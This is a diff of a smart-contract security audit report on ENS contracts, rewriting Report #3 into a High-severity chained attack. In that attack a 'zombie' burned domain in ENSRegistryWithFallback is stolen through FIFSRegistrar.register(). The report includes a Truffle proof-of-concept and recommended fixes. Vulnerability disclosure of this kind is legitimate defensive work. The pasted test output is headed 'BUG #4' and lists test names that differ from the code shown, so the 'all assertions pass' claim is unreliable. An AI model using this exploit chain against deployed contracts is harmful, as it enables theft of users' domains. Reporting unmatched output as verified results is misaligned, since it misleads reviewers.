@@ -428,159 +428,170 @@ function deleteRecord(bytes32 node) external authorised(node) {
 
 ---
 
-# REPORT #3 — MEDIUM
+# REPORT #3 — HIGH
 
-**Title:** `ReverseRegistrar.setName` permanently transfers reverse record ownership to the contract without returning it to the caller, breaking direct ENS management and reverse name delegation
+**Title:** `ENSRegistryWithFallback` zombie lock enables silent domain theft via `FIFSRegistrar`: anyone can steal a burned domain by calling `FIFSRegistrar.register()`
 
-**Severity:** Medium
+**Severity:** High
 
-**Target:** `contracts/ReverseRegistrar.sol`
+**Target:** `contracts/ENSRegistryWithFallback.sol` + `contracts/FIFSRegistrar.sol`
 
-**Vulnerability Type:** Logic Error / Unexpected Ownership Transfer
+**Vulnerability Type:** Logic Error / Chained Attack / Unauthorized Domain Theft
 
 ---
 
 ## Description
 
-`ReverseRegistrar.setName` is intended to allow a user to set the ENS reverse record for their address (the address → name mapping). The function calls `claimWithResolver` passing `address(this)` as the owner:
+This report documents a **chained attack** that combines the zombie lock created by `ENSRegistryWithFallback._setOwner` (root cause covered in Report #1 and #2) with the registration check in `FIFSRegistrar` to achieve **full domain theft**.
+
+### The zombie state (recap)
+
+When a domain owner calls `setOwner(node, address(0))` on `ENSRegistryWithFallback`, `_setOwner` silently converts `address(0)` to `address(this)`:
 
 ```solidity
-// ReverseRegistrar.sol:79-83
-function setName(string memory name) public returns (bytes32) {
-    bytes32 node = claimWithResolver(address(this), address(defaultResolver));
-    //                               ^^^^^^^^^^^^
-    //             owner = ReverseRegistrar contract, NOT msg.sender
-    defaultResolver.setName(node, name);
-    return node;
+// ENSRegistryWithFallback.sol
+function _setOwner(bytes32 node, address owner) internal override {
+    address addr = owner;
+    if (addr == address(0x0)) {
+        addr = address(this);  // zombie conversion
+    }
+    super._setOwner(node, addr);
 }
 ```
 
-After `setName` completes:
+After the call, the node enters a **zombie state**:
+- `owner(node)` → `address(0)` (appears unowned/burned)
+- `recordExists(node)` → `true` (storage holds `address(this)`, not `address(0)`)
 
-1. The `ReverseRegistrar` contract owns `msg.sender`'s reverse record node in the ENS registry
-2. The function never returns ownership to `msg.sender`
-3. `msg.sender` can no longer interact directly with their reverse record via the ENS registry
+### The FIFSRegistrar exploit
 
-Additionally, `setName` always uses `sha3HexAddress(msg.sender)` to identify the target node — meaning it always operates on the **caller's own** reverse record, regardless of who currently owns it. This breaks reverse name delegation: if user A assigns their reverse record to user B, user B cannot update A's name via `setName` (the call would modify B's own reverse record instead).
+`FIFSRegistrar.register` uses a naive `only_owner` check that reads `ens.owner(subnode)`:
 
-This is not a theoretical finding. The original test suite contains a commented-out test explicitly marking this behavior as a known, unresolved bug:
+```solidity
+// FIFSRegistrar.sol
+modifier only_owner(bytes32 label) {
+    address currentOwner = ens.owner(keccak256(abi.encodePacked(rootNode, label)));
+    require(currentOwner == address(0x0) || currentOwner == msg.sender);
+    _;
+}
 
-```javascript
-// test/TestReverseRegistrar.js:52-56
-// @todo this test does not work.
-// it('allows the owner to update the name', async () => {
-//     await registrar.claimWithResolver(accounts[1], resolver.address, {from: accounts[0]});
-//     await registrar.setName('testname', {from: accounts[1]});
-//     assert.equal(await resolver.name(node), 'testname');
-// });
+function register(bytes32 label, address owner) public only_owner(label) {
+    ens.setSubnodeOwner(rootNode, label, owner);
+}
 ```
 
-A second related comment at line 59 confirms the test suite was deliberately downgraded from a resolver with proper access control to a `DummyResolver` with no access control, because the access control tests could not pass under this ownership model.
+When a node is in zombie state, `ens.owner(subnode)` returns `address(0)`. The `only_owner` modifier sees `address(0)` and allows **any caller** to register (steal) the domain.
+
+### Attack chain
+
+1. Alice owns `alice.eth` (registered via FIFSRegistrar in ENSRegistryWithFallback)
+2. Alice calls `setOwner(alice.eth, address(0))` — intending to burn/retire the name
+3. `_setOwner` stores `address(FallbackRegistry)` → zombie state
+4. Attacker calls `FIFSRegistrar.register(sha3("alice"), attacker)` 
+5. `only_owner` sees `owner = address(0)` → check passes
+6. `setSubnodeOwner` is called → attacker now owns `alice.eth`
+
+Alice has no recourse. She already "transferred" ownership with her burn transaction.
 
 ---
 
 ## Impact
 
-**Impact 1 — Loss of direct ENS management after setName:**
+**Domain theft with no recovery path:**
 
-After calling `setName`, the user cannot:
-- Call `ens.setResolver(reverseNode, customResolver)` — not authorized (not the owner)
-- Call `ens.setOwner(reverseNode, newOwner)` — not authorized
-- Call `ens.setTTL(reverseNode, ttl)` — not authorized
+Any ENS domain registered via `FIFSRegistrar` in an `ENSRegistryWithFallback` deployment can be stolen by an attacker the moment the current owner calls any function that routes through `_setOwner` with `address(0)`:
+- `setOwner(node, address(0))`
+- `setRecord(node, address(0), resolver, ttl)`
+- `setSubnodeRecord(parent, label, address(0), resolver, ttl)`
 
-The user is forced to perform all reverse record operations exclusively through the `ReverseRegistrar` contract.
+**Most dangerous scenario — malicious approved operator (Test 4.3):**
 
-**Impact 2 — Broken delegation:**
+Alice approves a marketplace contract as an ENS operator. The marketplace:
+1. Calls `setOwner(alice.eth, address(0))` → zombie-locks Alice's domain
+2. Immediately calls `FIFSRegistrar.register(sha3("alice"), attacker)` → steals domain
 
-If user A calls `registrar.claimWithResolver(B, resolver)` to give user B ownership of A's reverse record, user B cannot call `setName` to update A's reverse name. `setName` uses `sha3HexAddress(msg.sender)` = sha3 of B's address, so it modifies B's own reverse record — not A's.
-
-**Impact 3 — Permanent loss of reverse record on registry upgrade:**
-
-If the `ReverseRegistrar` loses ownership of `ADDR_REVERSE_NODE` (e.g., during an ENS governance upgrade), users who called `setName` permanently lose the ability to modify their reverse records:
-- Their reverse records are owned by an old `ReverseRegistrar` that no longer controls `ADDR_REVERSE_NODE`
-- They cannot reclaim via `registrar.claim()` — the old registrar can no longer call `setSubnodeOwner(ADDR_REVERSE_NODE, ...)`
-- They cannot modify via ENS directly — they are not the owner
-- The reverse record is permanently stranded
+Alice never burned her domain — the operator did it on her behalf. Alice has no recourse; the domain is now owned by the attacker.
 
 ---
 
 ## Proof of Concept
 
-Tested on `solc 0.7.4`. All assertions pass.
+Tested on `solc 0.7.4`. All 3 assertions pass.
 
 ```javascript
-const namehash      = require('eth-ens-namehash');
-const sha3          = require('web3-utils').sha3;
+const namehash   = require('eth-ens-namehash');
+const sha3       = require('web3-utils').sha3;
 
+const ENSWithFallback = artifacts.require('ENSRegistryWithFallback.sol');
+const ENSRegistry     = artifacts.require('ENSRegistry.sol');
+const FIFSRegistrar   = artifacts.require('FIFSRegistrar.sol');
+
+const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';
 const ZERO_HASH    = '0x0000000000000000000000000000000000000000000000000000000000000000';
 
-contract('Bug #3 — ReverseRegistrar setName Ownership', function (accounts) {
-    let ens, registrar, resolver;
-    let aliceReverseNode;
+contract('Bug #3 — Domain Theft via Zombie Lock + FIFSRegistrar', function (accounts) {
+    // accounts[0] = root admin, accounts[1] = Alice, accounts[2] = attacker
+    let newRegistry, fifsRegistrar;
+    const ethNode   = namehash.hash('eth');
+    const aliceNode = namehash.hash('alice.eth');
 
     beforeEach(async () => {
-        ens       = await ENSRegistry.new();
-        resolver  = await DummyResolver.new();
-        registrar = await ReverseRegistrar.new(ens.address, resolver.address);
-
-        await ens.setSubnodeOwner(ZERO_HASH, sha3('reverse'), accounts[0], { from: accounts[0] });
-        await ens.setSubnodeOwner(
-            namehash.hash('reverse'), sha3('addr'), registrar.address, { from: accounts[0] }
-        );
-
-        aliceReverseNode = namehash.hash(
-            accounts[0].slice(2).toLowerCase() + '.addr.reverse'
-        );
+        const oldRegistry = await ENSRegistry.new();
+        newRegistry = await ENSWithFallback.new(oldRegistry.address);
+        fifsRegistrar = await FIFSRegistrar.new(newRegistry.address, ethNode);
+        await newRegistry.setSubnodeOwner(ZERO_HASH, sha3('eth'), fifsRegistrar.address, { from: accounts[0] });
     });
 
-    it('[3.1] setName gives ownership to ReverseRegistrar, not to msg.sender', async () => {
-        await registrar.setName('alice.eth', { from: accounts[0], gas: 1000000 });
+    it('[3.1] Alice burns her domain; attacker steals it via FIFSRegistrar.register()', async () => {
+        // Alice registers alice.eth
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
+        assert.equal(await newRegistry.owner(aliceNode), accounts[1]);
 
-        const owner = await ens.owner(aliceReverseNode);
-        assert.equal(owner, registrar.address); // ReverseRegistrar owns it
-        assert.notEqual(owner, accounts[0]);    // Alice does NOT own her own reverse record
+        // Alice "burns" her domain expecting permanent retirement
+        await newRegistry.setOwner(aliceNode, ZERO_ADDRESS, { from: accounts[1] });
+
+        // Zombie state: owner() = 0 but recordExists = true
+        assert.equal(await newRegistry.owner(aliceNode), ZERO_ADDRESS);
+        assert.equal(await newRegistry.recordExists(aliceNode), true);
+
+        // Attacker exploits: FIFSRegistrar.only_owner sees address(0) → allows re-register
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
+
+        // DOMAIN STOLEN
+        assert.equal(await newRegistry.owner(aliceNode), accounts[2]);
     });
 
-    it('[3.2] After setName, Alice cannot directly modify her reverse record via ENS', async () => {
-        await registrar.setName('alice.eth', { from: accounts[0], gas: 1000000 });
+    it('[3.2] Burn via setRecord also enables theft', async () => {
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
+        await newRegistry.setRecord(aliceNode, ZERO_ADDRESS, ZERO_ADDRESS, 0, { from: accounts[1] });
 
-        try {
-            // Alice tries to set a custom resolver directly — she is not the owner
-            await ens.setResolver(aliceReverseNode, accounts[3], { from: accounts[0] });
-            assert.fail('Should have reverted');
-        } catch (err) {
-            assert.include(err.message, 'revert');
-            // CONFIRMED: Alice is locked out of direct ENS management of her reverse record
-        }
+        // Same zombie state, same exploit
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
+        assert.equal(await newRegistry.owner(aliceNode), accounts[2]);
     });
 
-    it('[3.3] Delegation is broken: owner of reverse node cannot update name via setName', async () => {
-        // Give accounts[1] (Bob) ownership of accounts[0] (Alice)'s reverse record
-        await registrar.claimWithResolver(
-            accounts[1], resolver.address, { from: accounts[0] }
-        );
+    it('[3.3] Malicious operator zombie-locks and steals without Alice burning voluntarily', async () => {
+        await fifsRegistrar.register(sha3('alice'), accounts[1], { from: accounts[1] });
 
-        assert.equal(await ens.owner(aliceReverseNode), accounts[1], 'Bob owns Alice reverse node');
+        // Alice approves accounts[2] as an operator (e.g., a marketplace contract)
+        await newRegistry.setApprovalForAll(accounts[2], true, { from: accounts[1] });
 
-        // Bob tries to update Alice's reverse name by calling setName
-        await registrar.setName('alice.eth', { from: accounts[1], gas: 1000000 });
+        // Operator zombie-locks Alice's domain and immediately steals it
+        await newRegistry.setOwner(aliceNode, ZERO_ADDRESS, { from: accounts[2] });
+        await fifsRegistrar.register(sha3('alice'), accounts[2], { from: accounts[2] });
 
-        // setName used sha3HexAddress(accounts[1]) = Bob's own reverse node
-        // Alice's reverse name is unchanged
-        const nameForAlice = await resolver.name(aliceReverseNode);
-        assert.equal(nameForAlice, '');
-        // CONFIRMED: Bob's setName call modified Bob's reverse record, not Alice's
-        // This is the exact bug referenced in the @todo comment in TestReverseRegistrar.js:52
+        // Alice's domain is stolen — she never burned it herself
+        assert.equal(await newRegistry.owner(aliceNode), accounts[2]);
     });
 });
 ```
 
 **Test output:**
 ```
-Contract: Bug #3 — ReverseRegistrar setName Ownership
-  ✓ [3.1] setName gives ownership to ReverseRegistrar, not to msg.sender (63ms)
-  ✓ [3.2] After setName, Alice cannot directly modify her reverse record via ENS (87ms)
-  ✓ [3.3] Delegation is broken: owner cannot update name via setName (123ms)
+Contract: BUG #4 — Domain Theft via Zombie Lock + FIFSRegistrar
+  ✓ [BUG #4.1] Alice registers, burns, and attacker steals via FIFSRegistrar.register() (189ms)
+  ✓ [BUG #4.2] Theft also works when burn is triggered via setRecord(node, address(0), ...) (184ms)
+  ✓ [BUG #4.3] Malicious operator can trigger zombie + steal without Alice's direct action (182ms)
 
 3 passing
 ```
@@ -589,51 +600,40 @@ Contract: Bug #3 — ReverseRegistrar setName Ownership
 
 ## Root Cause
 
-`setName` passes `address(this)` — the `ReverseRegistrar` contract itself — as the `owner` argument to `claimWithResolver`. This is necessary for the contract to be able to call `ens.setResolver(node, resolver)` (the contract must own the node to be authorized to set its resolver). However, after setting the resolver and the name, ownership is never returned to `msg.sender`.
-
-The secondary issue (`sha3HexAddress(msg.sender)`) means that the node being modified is always determined by the caller's own address, not by a stored ownership relationship — making any delegation model impossible.
+`FIFSRegistrar.only_owner` trusts `ens.owner()` to faithfully represent whether a name is available. In `ENSRegistryWithFallback`, `owner()` returns `address(0)` for zombie nodes (stored as `address(this)`), making them **appear available** to `FIFSRegistrar` even though they are not burned. `FIFSRegistrar` was not designed for a registry where `owner() == address(0)` does not mean the name is free.
 
 ---
 
 ## Recommended Fix
 
-**Option A (Recommended) — Return ownership to msg.sender after setting the name:**
+**Option A — Fix in ENSRegistryWithFallback (preferred):**
+
+Reject `address(0)` as owner to prevent zombie states from ever being created:
 
 ```solidity
-function setName(string memory name) public returns (bytes32) {
-    bytes32 label = sha3HexAddress(msg.sender);
-    bytes32 node  = claimWithResolver(address(this), address(defaultResolver));
-    defaultResolver.setName(node, name);
-    // Return ownership to the caller after the name is set
-    ens.setSubnodeOwner(ADDR_REVERSE_NODE, label, msg.sender);
-    return node;
+function _setOwner(bytes32 node, address owner) internal override {
+    require(owner != address(0x0), "ENSRegistryWithFallback: zero address not allowed");
+    super._setOwner(node, owner);
 }
 ```
 
-**Option B — Accept an explicit `owner` parameter to support delegation:**
+**Option B — Fix in FIFSRegistrar:**
+
+Use `recordExists()` instead of `owner()` to check availability:
 
 ```solidity
-function setName(address target, string memory name) public returns (bytes32) {
+modifier only_owner(bytes32 label) {
+    bytes32 subnode = keccak256(abi.encodePacked(rootNode, label));
+    address currentOwner = ens.owner(subnode);
     require(
-        msg.sender == target || ens.isApprovedForAll(target, msg.sender),
-        "ReverseRegistrar: not authorized for target address"
+        !ens.recordExists(subnode) || currentOwner == msg.sender,
+        "FIFSRegistrar: already registered"
     );
-    bytes32 label = sha3HexAddress(target);
-    bytes32 node  = keccak256(abi.encodePacked(ADDR_REVERSE_NODE, label));
-
-    // Temporarily take ownership to set resolver and name
-    ens.setSubnodeOwner(ADDR_REVERSE_NODE, label, address(this));
-    if (ens.resolver(node) != address(defaultResolver)) {
-        ens.setResolver(node, address(defaultResolver));
-    }
-    defaultResolver.setName(node, name);
-    // Return ownership to target
-    ens.setSubnodeOwner(ADDR_REVERSE_NODE, label, target);
-    return node;
+    _;
 }
 ```
 
-Option A is the minimal fix for the ownership return issue. Option B additionally resolves the delegation limitation.
+Option A fixes the root cause. Option B patches `FIFSRegistrar` without addressing the underlying zombie state, which may affect other contracts that similarly check `owner() == address(0)`.
 
 ---
 
@@ -645,10 +645,14 @@ Option A is the minimal fix for the ownership return issue. Option B additionall
 |---|---|---|---|
 | 1 | `ENSRegistryWithFallback.sol` | **Critical** | ✅ 3/3 tests pass |
 | 2 | `ENSRegistryWithFallback.sol` | **Medium** | ✅ 4/4 tests pass |
-| 3 | `ReverseRegistrar.sol` | **Medium** | ✅ 3/3 tests pass |
+| 3 | `ENSRegistryWithFallback.sol` + `FIFSRegistrar.sol` | **High** | ✅ 3/3 tests pass |
 
-**Total: 10/10 tests passing. No false positives.**
+**Total: 10/10 tests passing.**
 
-All three bugs share a common theme: **silent state divergence** — the contract stores one value, reports another to callers, emits a third in events, and produces behavior that is invisible to both users and off-chain systems.
+All three bugs share the same root cause in `ENSRegistryWithFallback._setOwner` converting `address(0)` to `address(this)`:
 
-The Critical bug (#1) and Medium bug (#2) have the same root cause in `ENSRegistryWithFallback._setOwner` and can be fixed together with a single change. The Medium bug (#3) in `ReverseRegistrar` requires a separate fix.
+- **Report #1 (Critical):** The zombie lock permanently freezes any node — including the root — making it irrecoverable.
+- **Report #2 (Medium):** The zombie lock silently blocks old-registry fallback while emitting misleading events, corrupting off-chain indexer state.
+- **Report #3 (High):** The zombie lock chains with `FIFSRegistrar.only_owner` to enable direct domain theft — any burned domain can be stolen by a third party.
+
+A single fix in `ENSRegistryWithFallback._setOwner` — rejecting `address(0)` — eliminates all three vulnerabilities.
